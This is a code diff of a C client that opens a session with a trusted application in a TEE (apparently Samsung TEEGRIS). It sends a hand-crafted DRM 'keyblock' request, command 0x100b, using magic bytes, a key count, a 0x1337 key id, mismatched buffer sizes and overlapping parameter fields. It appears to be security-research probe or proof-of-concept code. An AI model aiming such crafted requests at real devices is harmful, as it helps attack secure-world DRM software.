@@ -18,49 +18,42 @@ void (*TEEC_CloseSession_impl)(TEEC_Session*);
 TEEC_Result (*TEEC_InvokeCommand_impl)(TEEC_Session*,uint32_t,TEEC_Operation*,uint32_t*);
 TEEC_Result (*TEEC_RegisterSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);
 
-void call_ta(TEEC_Context *context, TEEC_Session *session)
+void send_req(TEEC_Context *context, TEEC_Session *session)
 {
     void* mem_area1 = malloc(0x1000);
     memset(mem_area1, 0, 0x1000);
-    void* mem_area2 = malloc(0x1000);
-    memset(mem_area2, 0, 0x1000);
+    int* int_mem_area = (int*)mem_area1;
+    *(uint8_t *)(mem_area1) = 0x4B;
+    *(uint8_t *)(mem_area1 + 1) = 0x42;
+    *(uint8_t *)(mem_area1 + 2) = 0x50;
+    *(uint8_t *)(mem_area1 + 3) = 0x4D;
+    int_mem_area[17] = 2; //keycount
+    int_mem_area[18] = 0x1337; // drmKeyId
     
     TEEC_Operation op;
     memset(&op, 0, sizeof(op));
-    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT, TEEC_VALUE_INOUT,
+    op.paramTypes = TEEC_PARAM_TYPES(TEEC_VALUE_INOUT,TEEC_MEMREF_TEMP_INPUT,
                                      TEEC_NONE, TEEC_NONE);
-    op.params[0].tmpref.buffer = mem_area1;
-    op.params[0].tmpref.size =  0x1000; 
-    op.params[1].tmpref.buffer = mem_area2;
-    op.params[1].tmpref.size =  0x1000; 
-    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT, TEEC_MEMREF_TEMP_INOUT,
-                                     TEEC_NONE, TEEC_NONE); 
+    printf("params: 0x%lx\n", op.paramTypes);
+    op.params[0].tmpref.buffer = mem_area1;  // the keyblock buffer
+    op.params[0].tmpref.size =  0x370; 
+    op.params[1].tmpref.buffer = (void*)malloc(0x1000);  // the keyblock buffer
+    op.params[1].tmpref.size =  0x100; 
+    op.params[0].value.a = 4;
+    op.params[0].value.b = 4;
     uint32_t err_origin;
 
-    TEEC_Result res = TEEC_InvokeCommand_impl(session, 1, &op, &err_origin);
-    printf("\t ret: %x :/\n", res);
+    TEEC_Result res = TEEC_InvokeCommand_impl(session, 0x100b, &op, &err_origin);
 }
 
 
 int main(int argc, char **argv)
 {
-    char* ta = "08110000000000000000000000000000";
-    unsigned char hex_b[0x40] = {0}; 
-    hex2bytes(ta,hex_b);
+    char* ta = "377ee4e8-af0e-474f-a9d636a9268fe85c";
+    TEEC_UUID *uuid = teegris_uuid(ta);
+
     TEEC_Context context;
     TEEC_Session session;
-    TEEC_UUID *uuid = (TEEC_UUID *)malloc(sizeof(TEEC_UUID));
-    uint32_t timeLow;
-    uuid->timeLow = (uint32_t)hex_b[0] << 24 |
-      (uint32_t)hex_b[1] << 16 |
-      (uint32_t)hex_b[2] << 8  |
-      (uint32_t)hex_b[3];
-    uuid->timeMid = (uint16_t)hex_b[4] << 8 | (uint16_t)hex_b[5];
-    uuid->timeHiAndVersion = (uint16_t)hex_b[6] << 8 | (uint16_t)hex_b[7];
-    for(int i = 0; i<8; i++){
-        uuid->clockSeqAndNode[i] = (uint8_t)hex_b[8+i];
-    }
-
     uint32_t err_origin;
     TEEC_Result res;
 
@@ -81,7 +74,11 @@ int main(int argc, char **argv)
         TEEC_FinalizeContext_impl(&context);
         exit(-1);
     }
-    call_ta(&context, &session);
+
+    // write banner
+    printf("[+] drm query...\n");
+    send_req(&context, &session);
+    printf("[+] done...\n");
     TEEC_CloseSession_impl(&session);
     TEEC_FinalizeContext_impl(&context);
     return 0;
